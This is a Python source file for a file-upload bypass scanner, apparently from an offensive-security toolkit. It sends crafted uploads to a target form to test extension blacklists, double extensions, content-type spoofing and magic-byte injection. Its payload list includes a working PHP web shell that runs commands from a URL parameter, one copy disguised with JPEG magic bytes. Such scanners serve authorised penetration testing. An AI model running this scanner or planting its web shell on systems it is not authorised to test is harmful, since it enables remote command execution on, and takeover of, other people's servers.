import requests
import os

class UploadExpertScanner:
    """
    Expert Auditor for File Upload Bypass.
    Tests extension blacklists, content-type spoofing, and Magic Byte injection.
    """
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        
        # Magic bytes for common types to bypass signature checks
        self.magic_bytes = {
            "jpg": b"\xFF\xD8\xFF\xDB",
            "png": b"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A",
            "gif": b"GIF89a"
        }

    def scan_upload_form(self, action_url, file_param="file", logger=None):
        findings = []
        if logger: logger(f"Upload Expert: Testing bypass on {action_url}...", "INFO")

        # Attack Payloads
        payloads = [
            # 1. Simple PHP shell with JPG extension (if server only checks extension)
            {"filename": "shell.php.jpg", "content": b"<?php system($_GET['cmd']); ?>", "type": "image/jpeg"},
            # 2. Magic Byte Injection (JPG signature at start of PHP code)
            {"filename": "magic_shell.php", "content": self.magic_bytes["jpg"] + b"<?php system($_GET['cmd']); ?>", "type": "image/jpeg"},
            # 3. Double extension bypass
            {"filename": "shell.php.png", "content": b"<?php phpinfo(); ?>", "type": "image/png"},
            # 4. Content-Type Spoofing only
            {"filename": "shell_spoof.php", "content": b"<?php echo 'RedOps3'; ?>", "type": "image/jpeg"}
        ]

        for p in payloads:
            try:
                files = {file_param: (p["filename"], p["content"], p["type"])}
                # Test the upload
                resp = self.session.post(action_url, files=files, timeout=7)
                
                # Check for success indicators (200/201 and message)
                success_indicators = ["success", "uploaded", "saved", p["filename"]]
                if resp.status_code in [200, 201] and any(ind in resp.text.lower() for ind in success_indicators):
                    findings.append({
                        "title": "File Upload Bypass Potential",
                        "description": f"Successfully uploaded suspicious file: {p['filename']}\nMethod: {p.get('method', 'Signature/Extension Spoofing')}\nAction URL: {action_url}",
                        "severity": "high",
                        "tool_source": "upload_expert",
                        "url": action_url,
                        "raw_loot": f"Payload: {p['filename']} sent with Content-Type: {p['type']}"
                    })
                    if logger: logger(f"HIGH: File Upload Bypass candidates at {action_url}", "WARN")
                    
                    # Try to find the uploaded file? (Usually risky/out of scope without surface mapper)
            except Exception:
                pass
        
        return findings
